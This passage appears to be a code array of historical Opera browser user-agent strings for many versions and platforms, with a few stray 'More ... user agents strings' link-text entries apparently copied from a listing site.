    "Opera/9.80 (Windows NT 6.0; U; zh-cn) Presto/2.5.22 Version/10.50",
    "Opera/9.80 (Windows NT 5.1; U; sk) Presto/2.5.22 Version/10.50",
    "Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.22 Version/10.50",
    "Opera/10.50 (Windows NT 6.1; U; en-GB) Presto/2.2.2",
    "Opera/9.80 (S60; SymbOS; Opera Tablet/9174; U; en) Presto/2.7.81 Version/10.5",
    "Opera/9.80 (X11; U; Linux i686; en-US; rv:1.9.2.3) Presto/2.2.15 Version/10.10",
    "Opera/9.80 (X11; Linux x86_64; U; it) Presto/2.2.15 Version/10.10",
    "Opera/9.80 (Windows NT 6.1; U; de) Presto/2.2.15 Version/10.10",
    "Opera/9.80 (Windows NT 6.0; U; Gecko/20100115; pl) Presto/2.2.15 Version/10.10",
    "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.2.15 Version/10.10",
    "Opera/9.80 (Windows NT 5.1; U; de) Presto/2.2.15 Version/10.10",
    "Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.2.15 Version/10.10",
    "Mozilla/5.0 (Windows NT 6.0; U; tr; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 10.10",
    "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; de) Opera 10.10",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.0; tr) Opera 10.10",
    "Opera/9.80 (X11; Linux x86_64; U; en-GB) Presto/2.2.15 Version/10.01",
    "Opera/9.80 (X11; Linux x86_64; U; en) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (X11; Linux x86_64; U; de) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (X11; Linux i686; U; ru) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (X11; Linux i686; U; pt-BR) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (X11; Linux i686; U; pl) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (X11; Linux i686; U; nb) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (X11; Linux i686; U; en-GB) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (X11; Linux i686; U; Debian; pl) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (X11; Linux i686; U; de) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (Windows NT 6.1; U; fi) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (Windows NT 6.1; U; de) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (Windows NT 6.1; U; cs) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (Windows NT 6.0; U; de) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (Windows NT 5.1; U; zh-cn) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.2.15 Version/10.00",
    "Opera/9.99 (X11; U; sk)",
    "Opera/9.99 (Windows NT 5.1; U; pl) Presto/9.9.9",
    "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15",
    "Opera/9.70 (Linux ppc64 ; U; en) Presto/2.2.1",
    "Opera/9.70 (Linux i686 ; U; zh-cn) Presto/2.2.0",
    "Opera/9.70 (Linux i686 ; U; en-us) Presto/2.2.0",
    "Opera/9.70 (Linux i686 ; U; en) Presto/2.2.1",
    "Opera/9.70 (Linux i686 ; U; en) Presto/2.2.0",
    "Opera/9.70 (Linux i686 ; U; ; en) Presto/2.2.1",
    "Opera/9.70 (Linux i686 ; U;  ; en) Presto/2.2.1",
    "Mozilla/5.0 (Linux i686 ; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.70",
    "Mozilla/4.0 (compatible; MSIE 6.0; Linux i686 ; en) Opera 9.70",
    "HTC_HD2_T8585 Opera/9.70 (Windows NT 5.1; U; de)",
    "Opera 9.7 (Windows NT 5.2; U; en)",
    "Opera/9.64(Windows NT 5.1; U; en) Presto/2.1.1",
    "Opera/9.64 (X11; Linux x86_64; U; pl) Presto/2.1.1",
    "Opera/9.64 (X11; Linux x86_64; U; hr) Presto/2.1.1",
    "Opera/9.64 (X11; Linux x86_64; U; en-GB) Presto/2.1.1",
    "Opera/9.64 (X11; Linux x86_64; U; en) Presto/2.1.1",
    "Opera/9.64 (X11; Linux x86_64; U; de) Presto/2.1.1",
    "Opera/9.64 (X11; Linux x86_64; U; cs) Presto/2.1.1",
    "Opera/9.64 (X11; Linux i686; U; tr) Presto/2.1.1",
    "Opera/9.64 (X11; Linux i686; U; sv) Presto/2.1.1",
    "Opera/9.64 (X11; Linux i686; U; pl) Presto/2.1.1",
    "Opera/9.64 (X11; Linux i686; U; nb) Presto/2.1.1",
    "Opera/9.64 (X11; Linux i686; U; Linux Mint; nb) Presto/2.1.1",
    "Opera/9.64 (X11; Linux i686; U; Linux Mint; it) Presto/2.1.1",
    "Opera/9.64 (X11; Linux i686; U; en) Presto/2.1.1",
    "Opera/9.64 (X11; Linux i686; U; de) Presto/2.1.1",
    "Opera/9.64 (X11; Linux i686; U; da) Presto/2.1.1",
    "Opera/9.64 (Windows NT 6.1; U; MRA 5.5 (build 02842); ru) Presto/2.1.1",
    "Opera/9.64 (Windows NT 6.1; U; de) Presto/2.1.1",
    "Opera/9.64 (Windows NT 6.0; U; zh-cn) Presto/2.1.1",
    "Opera/9.64 (Windows NT 6.0; U; pl) Presto/2.1.1",
    "More Opera 9.64 user agents strings -->>",
    "Opera/9.63 (X11; Linux x86_64; U; ru) Presto/2.1.1",
    "Opera/9.63 (X11; Linux x86_64; U; cs) Presto/2.1.1",
    "Opera/9.63 (X11; Linux i686; U; ru) Presto/2.1.1",
    "Opera/9.63 (X11; Linux i686; U; ru)",
    "Opera/9.63 (X11; Linux i686; U; nb) Presto/2.1.1",
    "Opera/9.63 (X11; Linux i686; U; en)",
    "Opera/9.63 (X11; Linux i686; U; de) Presto/2.1.1",
    "Opera/9.63 (X11; Linux i686)",
    "Opera/9.63 (X11; FreeBSD 7.1-RELEASE i386; U; en) Presto/2.1.1",
    "Opera/9.63 (Windows NT 6.1; U; hu) Presto/2.1.1",
    "Opera/9.63 (Windows NT 6.1; U; en) Presto/2.1.1",
    "Opera/9.63 (Windows NT 6.1; U; de) Presto/2.1.1",
    "Opera/9.63 (Windows NT 6.0; U; pl) Presto/2.1.1",
    "Opera/9.63 (Windows NT 6.0; U; nb) Presto/2.1.1",
    "Opera/9.63 (Windows NT 6.0; U; fr) Presto/2.1.1",
    "Opera/9.63 (Windows NT 6.0; U; en) Presto/2.1.1",
    "Opera/9.63 (Windows NT 6.0; U; cs) Presto/2.1.1",
    "Opera/9.63 (Windows NT 5.2; U; en) Presto/2.1.1",
    "Opera/9.63 (Windows NT 5.2; U; de) Presto/2.1.1",
    "Opera/9.63 (Windows NT 5.1; U; pt-BR) Presto/2.1.1",
    "More Opera 9.63 user agents strings -->>",
    "Opera/9.62 (X11; Linux x86_64; U; ru) Presto/2.1.1",
    "Opera/9.62 (X11; Linux x86_64; U; en_GB, en_US) Presto/2.1.1",
    "Opera/9.62 (X11; Linux i686; U; pt-BR) Presto/2.1.1",
    "Opera/9.62 (X11; Linux i686; U; Linux Mint; en) Presto/2.1.1",
    "Opera/9.62 (X11; Linux i686; U; it) Presto/2.1.1",
    "Opera/9.62 (X11; Linux i686; U; fi) Presto/2.1.1",
    "Opera/9.62 (X11; Linux i686; U; en) Presto/2.1.1",
    "Opera/9.62 (Windows NT 6.1; U; en) Presto/2.1.1",
    "Opera/9.62 (Windows NT 6.1; U; de) Presto/2.1.1",
    "Opera/9.62 (Windows NT 6.0; U; pl) Presto/2.1.1",
    "Opera/9.62 (Windows NT 6.0; U; nb) Presto/2.1.1",
    "Opera/9.62 (Windows NT 6.0; U; en-GB) Presto/2.1.1",
    "Opera/9.62 (Windows NT 6.0; U; en) Presto/2.1.1",
    "Opera/9.62 (Windows NT 6.0; U; de) Presto/2.1.1",
    "Opera/9.62 (Windows NT 5.2; U; en) Presto/2.1.1",
    "Opera/9.62 (Windows NT 5.1; U; zh-tw) Presto/2.1.1",
    "Opera/9.62 (Windows NT 5.1; U; zh-cn) Presto/2.1.1",
    "Opera/9.62 (Windows NT 5.1; U; tr) Presto/2.1.1",
    "Opera/9.62 (Windows NT 5.1; U; ru) Presto/2.1.1",
    "Opera/9.62 (Windows NT 5.1; U; pt-BR) Presto/2.1.1",
    "Opera/9.61 (X11; Linux x86_64; U; fr) Presto/2.1.1",
    "Opera/9.61 (X11; Linux i686; U; ru) Presto/2.1.1",
    "Opera/9.61 (X11; Linux i686; U; pl) Presto/2.1.1",
    "Opera/9.61 (X11; Linux i686; U; en) Presto/2.1.1",
    "Opera/9.61 (X11; Linux i686; U; de) Presto/2.1.1",
    "Opera/9.61 (Windows NT 6.0; U; ru) Presto/2.1.1",
    "Opera/9.61 (Windows NT 6.0; U; pt-BR) Presto/2.1.1",
    "Opera/9.61 (Windows NT 6.0; U; http://lucideer.com; en-GB) Presto/2.1.1",
    "Opera/9.61 (Windows NT 6.0; U; en) Presto/2.1.1",
    "Opera/9.61 (Windows NT 5.2; U; en) Presto/2.1.1",
    "Opera/9.61 (Windows NT 5.1; U; zh-tw) Presto/2.1.1",
    "Opera/9.61 (Windows NT 5.1; U; zh-cn) Presto/2.1.1",
    "Opera/9.61 (Windows NT 5.1; U; ru) Presto/2.1.1",
    "Opera/9.61 (Windows NT 5.1; U; fr) Presto/2.1.1",
    "Opera/9.61 (Windows NT 5.1; U; en-GB) Presto/2.1.1",
    "Opera/9.61 (Windows NT 5.1; U; en) Presto/2.1.1",
    "Opera/9.61 (Windows NT 5.1; U; de) Presto/2.1.1",
    "Opera/9.61 (Windows NT 5.1; U; cs) Presto/2.1.1",
    "Opera/9.61 (Macintosh; Intel Mac OS X; U; de) Presto/2.1.1",
    "Mozilla/5.0 (Windows NT 5.1; U; en-GB; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.61",
    "Opera/9.60 (X11; Linux x86_64; U)",
    "Opera/9.60 (X11; Linux i686; U; ru) Presto/2.1.1",
    "Opera/9.60 (X11; Linux i686; U; en-GB) Presto/2.1.1",
    "Opera/9.60 (Windows NT 6.0; U; uk) Presto/2.1.1",
    "Opera/9.60 (Windows NT 6.0; U; ru) Presto/2.1.1",
    "Opera/9.60 (Windows NT 6.0; U; pl) Presto/2.1.1",
    "Opera/9.60 (Windows NT 6.0; U; de) Presto/2.1.1",
    "Opera/9.60 (Windows NT 6.0; U; bg) Presto/2.1.1",
    "Opera/9.60 (Windows NT 5.1; U; tr) Presto/2.1.1",
    "Opera/9.60 (Windows NT 5.1; U; sv) Presto/2.1.1",
    "Opera/9.60 (Windows NT 5.1; U; es-ES) Presto/2.1.1",
    "Opera/9.60 (Windows NT 5.1; U; en-GB) Presto/2.1.1",
    "Opera/9.60 (Windows NT 5.0; U; en) Presto/2.1.1",
    "Mozilla/5.0 (X11; Linux x86_64; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.60",
    "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.60",
    "Opera/9.52 (X11; Linux x86_64; U; ru)",
    "Opera/9.52 (X11; Linux x86_64; U; en)",
    "Opera/9.52 (X11; Linux x86_64; U)",
    "Opera/9.52 (X11; Linux ppc; U; de)",
    "Opera/9.52 (X11; Linux i686; U; fr)",
    "Opera/9.52 (X11; Linux i686; U; en)",
    "Opera/9.52 (X11; Linux i686; U; cs)",
    "Opera/9.52 (Windows NT 6.0; U; Opera/9.52 (X11; Linux x86_64; U); en)",
    "Opera/9.52 (Windows NT 6.0; U; fr)",
    "Opera/9.52 (Windows NT 6.0; U; en)",
    "Opera/9.52 (Windows NT 6.0; U; de)",
    "Opera/9.52 (Windows NT 5.2; U; ru)",
    "Opera/9.52 (Windows NT 5.0; U; en)",
    "Opera/9.52 (Macintosh; PPC Mac OS X; U; ja)",
    "Opera/9.52 (Macintosh; PPC Mac OS X; U; fr)",
    "Opera/9.52 (Macintosh; Intel Mac OS X; U; pt-BR)",
    "Opera/9.52 (Macintosh; Intel Mac OS X; U; pt)",
    "Mozilla/5.0 (Windows NT 5.1; U; de; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.52",
    "Mozilla/5.0 (Windows NT 5.1; U;  ; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.52",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 9.52",
    "Opera/9.51 (X11; Linux i686; U; Linux Mint; en)",
    "Opera/9.51 (X11; Linux i686; U; fr)",
    "Opera/9.51 (X11; Linux i686; U; de)",
    "Opera/9.51 (Windows NT 6.0; U; sv)",
    "Opera/9.51 (Windows NT 6.0; U; es)",
    "Opera/9.51 (Windows NT 6.0; U; en)",
    "Opera/9.51 (Windows NT 5.2; U; en)",
    "Opera/9.51 (Windows NT 5.1; U; nn)",
    "Opera/9.51 (Windows NT 5.1; U; fr)",
    "Opera/9.51 (Windows NT 5.1; U; es-LA)",
    "Opera/9.51 (Windows NT 5.1; U; es-AR)",
    "Opera/9.51 (Windows NT 5.1; U; en-GB)",
    "Opera/9.51 (Windows NT 5.1; U; en)",
    "Opera/9.51 (Windows NT 5.1; U; da)",
    "Opera/9.51 (Macintosh; Intel Mac OS X; U; en)",
    "Mozilla/5.0 (X11; Linux i686; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.51",
    "Mozilla/5.0 (Windows NT 6.0; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.51",
    "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.51",
    "Mozilla/5.0 (Windows NT 5.1; U; en-GB; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.51",
    "Mozilla/5.0 (Windows NT 5.1; U; de; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.51",
    "More Opera 9.51 user agents strings -->>",
    "Opera/9.50 (X11; Linux x86_64; U; pl)",
    "Opera/9.50 (X11; Linux x86_64; U; nb)",
    "Opera/9.50 (X11; Linux ppc; U; en)",
    "Opera/9.50 (X11; Linux i686; U; es-ES)",
    "Opera/9.50 (Windows NT 5.2; U; it)",
    "Opera/9.50 (Windows NT 5.1; U; ru)",
    "Opera/9.50 (Windows NT 5.1; U; nn)",
    "Opera/9.50 (Windows NT 5.1; U; nl)",
    "Opera/9.50 (Windows NT 5.1; U; it)",
    "Opera/9.50 (Windows NT 5.1; U; es-ES)",
    "Opera/9.50 (Macintosh; Intel Mac OS X; U; en)",
    "Opera/9.50 (Macintosh; Intel Mac OS X; U; de)",
    "Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.50",
    "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.50",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.0; en) Opera 9.50",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; en) Opera 9.50",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 9.50",
    "Opera/9.5 (Windows NT 6.0; U; en)",
    "Opera/9.5 (Windows NT 5.1; U; fr)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9b3) Gecko/2008020514 Opera 9.5",
    "Opera 9.4 (Windows NT 6.1; U; en)",
    "Opera 9.4 (Windows NT 5.3; U; en)",
    "Opera/9.30 (Nintendo Wii; U; ; 2071; Wii Shop Channel/1.0; en)",
    "Opera/9.30 (Nintendo Wii; U; ; 2047-7;pt-br)",
    "Opera/9.30 (Nintendo Wii; U; ; 2047-7;es)",
    "Opera/9.30 (Nintendo Wii; U; ; 2047-7;en)",
    "Opera/9.30 (Nintendo Wii; U; ; 2047-7; fr)",
    "Opera/9.30 (Nintendo Wii; U; ; 2047-7; de)",
    "Opera/9.27 (X11; Linux i686; U; fr)",
    "Opera/9.27 (X11; Linux i686; U; en)",
    "Opera/9.27 (Windows NT 5.2; U; en)",
    "Opera/9.27 (Windows NT 5.1; U; ja)",
    "Opera/9.27 (Macintosh; Intel Mac OS X; U; sv)",
    "Mozilla/5.0 (Windows NT 5.2; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.27",
    "Mozilla/5.0 (Windows NT 5.1; U; es-la; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.27",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.27",
    "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 9.27",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; en) Opera 9.27",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; es-la) Opera 9.27",
    "Opera/9.26 (Windows; U; pl)",
    "Opera/9.26 (Windows NT 5.1; U; zh-cn)",
    "Opera/9.26 (Windows NT 5.1; U; pl)",
    "Opera/9.26 (Windows NT 5.1; U; nl)",
    "Opera/9.26 (Windows NT 5.1; U; MEGAUPLOAD 2.0; en)",
    "Opera/9.26 (Windows NT 5.1; U; de)",
    "Opera/9.26 (Macintosh; PPC Mac OS X; U; en)",
    "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.26",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.0; en) Opera 9.26",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.26",
    "Opera/9.25 (X11; Linux i686; U; fr-ca)",
    "Opera/9.25 (X11; Linux i686; U; fr)",
    "Opera/9.25 (X11; Linux i686; U; en)",
    "Opera/9.25 (Windows NT 6.0; U; SV1; MEGAUPLOAD 2.0; ru)",
    "Opera/9.25 (Windows NT 6.0; U; sv)",
    "Opera/9.25 (Windows NT 6.0; U; ru)",
    "Opera/9.25 (Windows NT 6.0; U; MEGAUPLOAD 1.0; ru)",
    "Opera/9.25 (Windows NT 6.0; U; en-US)",
    "Opera/9.25 (Windows NT 5.2; U; en)",
    "Opera/9.25 (Windows NT 5.1; U; zh-cn)",
    "Opera/9.25 (Windows NT 5.1; U; ru)",
    "Opera/9.25 (Windows NT 5.1; U; MEGAUPLOAD 1.0; pt-br)",
    "Opera/9.25 (Windows NT 5.1; U; lt)",
    "Opera/9.25 (Windows NT 5.1; U; de)",
    "Opera/9.25 (Windows NT 5.0; U; en)",
    "Opera/9.25 (Windows NT 5.0; U; cs)",
    "Opera/9.25 (Windows NT 4.0; U; en)",
    "Opera/9.25 (OpenSolaris; U; en)",
    "Opera/9.25 (Macintosh; PPC Mac OS X; U; en)",
    "Opera/9.25 (Macintosh; Intel Mac OS X; U; en)",
    "More Opera 9.25 user agents strings -->>",
    "Opera/9.24 (X11; SunOS i86pc; U; en)",
    "Opera/9.24 (X11; Linux i686; U; de)",
    "Opera/9.24 (Windows NT 5.1; U; tr)",
    "Opera/9.24 (Windows NT 5.1; U; ru)",
    "Opera/9.24 (Windows NT 5.0; U; ru)",
    "Opera/9.24 (Macintosh; PPC Mac OS X; U; en)",
    "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.24",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.24",
    "Mozilla/4.0 (compatible; MSIE 6.0; Mac_PowerPC; en) Opera 9.24",
    "Opera/9.23 (X11; Linux x86_64; U; en)",
    "Opera/9.23 (X11; Linux i686; U; es-es)",
    "Opera/9.23 (X11; Linux i686; U; en)",
    "Opera/9.23 (Windows NT 6.0; U; de)",
    "Opera/9.23 (Windows NT 5.1; U; zh-cn)",
    "Opera/9.23 (Windows NT 5.1; U; SV1; MEGAUPLOAD 1.0; ru)",
    "Opera/9.23 (Windows NT 5.1; U; pt)",
    "Opera/9.23 (Windows NT 5.1; U; ja)",
    "Opera/9.23 (Windows NT 5.1; U; it)",
    "Opera/9.23 (Windows NT 5.1; U; fi)",
    "Opera/9.23 (Windows NT 5.1; U; en)",
    "Opera/9.23 (Windows NT 5.1; U; de)",
    "Opera/9.23 (Windows NT 5.1; U; da)",
    "Opera/9.23 (Windows NT 5.0; U; en)",
    "Opera/9.23 (Windows NT 5.0; U; de)",
    "Opera/9.23 (Nintendo Wii; U; ; 1038-58; Wii Internet Channel/1.0; en)",
    "Opera/9.23 (Macintosh; Intel Mac OS X; U; ja)",
    "Opera/9.23 (Mac OS X; ru)",
    "Opera/9.23 (Mac OS X; fr)",
    "Mozilla/5.0 (X11; Linux i686; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.23",
    "More Opera 9.23 user agents strings -->>",
    "Opera/9.22 (X11; OpenBSD i386; U; en)",
    "Opera/9.22 (X11; Linux i686; U; en)",
    "Opera/9.22 (X11; Linux i686; U; de)",
    "Opera/9.22 (Windows NT 6.0; U; ru)",
    "Opera/9.22 (Windows NT 6.0; U; en)",
    "Opera/9.22 (Windows NT 5.1; U; SV1; MEGAUPLOAD 2.0; ru)",
    "Opera/9.22 (Windows NT 5.1; U; SV1; MEGAUPLOAD 1.0; ru)",
    "Opera/9.22 (Windows NT 5.1; U; pl)",
    "Opera/9.22 (Windows NT 5.1; U; fr)",
    "Opera/9.22 (Windows NT 5.1; U; en)",
    "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.22",
    "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 9.22",
    "Opera/9.21 (X11; Linux x86_64; U; en)",
    "Opera/9.21 (X11; Linux i686; U; es-es)",
    "Opera/9.21 (X11; Linux i686; U; en)",
    "Opera/9.21 (X11; Linux i686; U; de)",
    "Opera/9.21 (Windows NT 6.0; U; nb)",
    "Opera/9.21 (Windows NT 6.0; U; en)",
    "Opera/9.21 (Windows NT 5.2; U; en)",
    "Opera/9.21 (Windows NT 5.1; U; SV1; MEGAUPLOAD 1.0; ru)",
    "Opera/9.21 (Windows NT 5.1; U; ru)",
    "Opera/9.21 (Windows NT 5.1; U; pt-br)",
    "Opera/9.21 (Windows NT 5.1; U; pl)",
    "Opera/9.21 (Windows NT 5.1; U; nl)",
    "Opera/9.21 (Windows NT 5.1; U; MEGAUPLOAD 1.0; en)",
    "Opera/9.21 (Windows NT 5.1; U; fr)",
    "Opera/9.21 (Windows NT 5.1; U; en)",
    "Opera/9.21 (Windows NT 5.1; U; de)",
    "Opera/9.21 (Windows NT 5.0; U; de)",
    "Opera/9.21 (Windows 98; U; en)",
    "Opera/9.21 (Macintosh; PPC Mac OS X; U; en)",
    "Opera/9.21 (Macintosh; Intel Mac OS X; U; en)",
    "More Opera 9.21 user agents strings -->>",
    "Opera/9.20(Windows NT 5.1; U; en)",
    "Opera/9.20 (X11; Linux x86_64; U; en)",
    "Opera/9.20 (X11; Linux ppc; U; en)",
    "Opera/9.20 (X11; Linux i686; U; tr)",
    "Opera/9.20 (X11; Linux i686; U; ru)",
    "Opera/9.20 (X11; Linux i686; U; pl)",
    "Opera/9.20 (X11; Linux i686; U; es-es)",
    "Opera/9.20 (X11; Linux i686; U; en)",
    "Opera/9.20 (X11; Linux i586; U; en)",
    "Opera/9.20 (Windows NT 6.0; U; es-es)",
    "Opera/9.20 (Windows NT 6.0; U; en)",
    "Opera/9.20 (Windows NT 6.0; U; de)",
    "Opera/9.20 (Windows NT 5.2; U; en)",
    "Opera/9.20 (Windows NT 5.1; U; zh-tw)",
    "Opera/9.20 (Windows NT 5.1; U; nb)",
    "Opera/9.20 (Windows NT 5.1; U; MEGAUPLOAD=1.0; es-es)",
    "Opera/9.20 (Windows NT 5.1; U; it)",
    "Opera/9.20 (Windows NT 5.1; U; es-es)",
    "Opera/9.20 (Windows NT 5.1; U; es-AR)",
    "Opera/9.20 (Windows NT 5.1; U; en)",
    "More Opera 9.20 user agents strings -->>",
    "Opera/9.12 (X11; Linux i686; U; en) (Ubuntu)",
    "Opera/9.12 (Windows NT 5.0; U; ru)",
    "Opera/9.12 (Windows NT 5.0; U)",
    "Opera/9.10 (X11; Linux; U; en)",
    "Opera/9.10 (X11; Linux x86_64; U; en)",
    "Opera/9.10 (X11; Linux i686; U; pl)",
    "Opera/9.10 (X11; Linux i686; U; kubuntu;pl)",
    "Opera/9.10 (X11; Linux i686; U; en)",
    "Opera/9.10 (X11; Linux i386; U; en)",
    "Opera/9.10 (Windows NT 6.0; U; it-IT)",
    "Opera/9.10 (Windows NT 6.0; U; en)",
    "Opera/9.10 (Windows NT 5.2; U; en)",
    "Opera/9.10 (Windows NT 5.2; U; de)",
    "Opera/9.10 (Windows NT 5.1; U; zh-tw)",
    "Opera/9.10 (Windows NT 5.1; U; sv)",
    "Opera/9.10 (Windows NT 5.1; U; pt)",
    "Opera/9.10 (Windows NT 5.1; U; pl)",
    "Opera/9.10 (Windows NT 5.1; U; nl)",
    "Opera/9.10 (Windows NT 5.1; U; MEGAUPLOAD 1.0; pl)",
    "Opera/9.10 (Windows NT 5.1; U; it)",
    "Opera/9.10 (Windows NT 5.1; U; hu)",
    "Opera/9.10 (Windows NT 5.1; U; fi)",
    "Opera/9.10 (Windows NT 5.1; U; es-es)",
    "More Opera 9.10 user agents strings -->>",
    "Opera/9.02 (X11; Linux i686; U; pl)",
    "Opera/9.02 (X11; Linux i686; U; hu)",
    "Opera/9.02 (X11; Linux i686; U; en)",
    "Opera/9.02 (X11; Linux i686; U; de)",
    "Opera/9.02 (Windows; U; nl)",
    "Opera/9.02 (Windows XP; U; ru)",
    "Opera/9.02 (Windows NT 5.2; U; en)",
    "Opera/9.02 (Windows NT 5.2; U; de)",
    "Opera/9.02 (Windows NT 5.1; U; zh-cn)",
    "Opera/9.02 (Windows NT 5.1; U; ru)",
    "Opera/9.02 (Windows NT 5.1; U; pt-br)",
    "Opera/9.02 (Windows NT 5.1; U; pl)",
    "Opera/9.02 (Windows NT 5.1; U; nb)",
    "Opera/9.02 (Windows NT 5.1; U; ja)",
    "Opera/9.02 (Windows NT 5.1; U; fi)",
    "Opera/9.02 (Windows NT 5.1; U; en)",
    "Opera/9.02 (Windows NT 5.1; U; de)",
    "Opera/9.02 (Windows NT 5.0; U; sv)",
    "Opera/9.02 (Windows NT 5.0; U; pl)",
    "Opera/9.02 (Windows NT 5.0; U; en)",
    "More Opera 9.02 user agents strings -->>",
    "Opera/9.01 (X11; OpenBSD i386; U; en)",
    "Opera/9.01 (X11; Linux i686; U; en)",
    "Opera/9.01 (X11; FreeBSD 6 i386; U;pl)",
    "Opera/9.01 (X11; FreeBSD 6 i386; U; en)",
    "Opera/9.01 (Windows NT 5.2; U; ru)",
    "Opera/9.01 (Windows NT 5.2; U; en)",
    "Opera/9.01 (Windows NT 5.1; U; ru)",
    "Opera/9.01 (Windows NT 5.1; U; pl)",
    "Opera/9.01 (Windows NT 5.1; U; ja)",
    "Opera/9.01 (Windows NT 5.1; U; es-es)",
    "Opera/9.01 (Windows NT 5.1; U; en)",
    "Opera/9.01 (Windows NT 5.1; U; de)",
    "Opera/9.01 (Windows NT 5.1; U; da)",
    "Opera/9.01 (Windows NT 5.1; U; cs)",
    "Opera/9.01 (Windows NT 5.1; U; bg)",
    "Opera/9.01 (Windows NT 5.1)",
    "Opera/9.01 (Windows NT 5.0; U; en)",
    "Opera/9.01 (Windows NT 5.0; U; de)",
    "Opera/9.01 (Macintosh; PPC Mac OS X; U; it)",
    "Opera/9.01 (Macintosh; PPC Mac OS X; U; en)",
    "More Opera 9.01 user agents strings -->>",
    "Opera/9.00 (X11; Linux i686; U; pl)",
    "Opera/9.00 (X11; Linux i686; U; en)",
    "Opera/9.00 (X11; Linux i686; U; de)",
    "Opera/9.00 (Windows; U)",
    "Opera/9.00 (Windows NT 5.2; U; ru)",
    "Opera/9.00 (Windows NT 5.2; U; pl)",
    "Opera/9.00 (Windows NT 5.2; U; en)",
    "Opera/9.00 (Windows NT 5.1; U; ru)",
    "Opera/9.00 (Windows NT 5.1; U; pl)",
    "Opera/9.00 (Windows NT 5.1; U; nl)",
    "Opera/9.00 (Windows NT 5.1; U; ja)",
    "Opera/9.00 (Windows NT 5.1; U; it)",
    "Opera/9.00 (Windows NT 5.1; U; fr)",
    "Opera/9.00 (Windows NT 5.1; U; fi)",
    "Opera/9.00 (Windows NT 5.1; U; es-es)",
    "Opera/9.00 (Windows NT 5.1; U; en)",
    "Opera/9.00 (Windows NT 5.1; U; de)",
    "Opera/9.00 (Windows NT 5.0; U; en)",
    "Opera/9.00 (Nintendo Wii; U; ; 1038-58; Wii Internet Channel/1.0; en)",
    "Opera/9.00 (Macintosh; PPC Mac OS X; U; es)",
    "More Opera 9.00 user agents strings -->>",
    "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; zh-cn) Opera 8.65",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; zh-cn) Opera 8.65",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Opera 8.65 [en]",
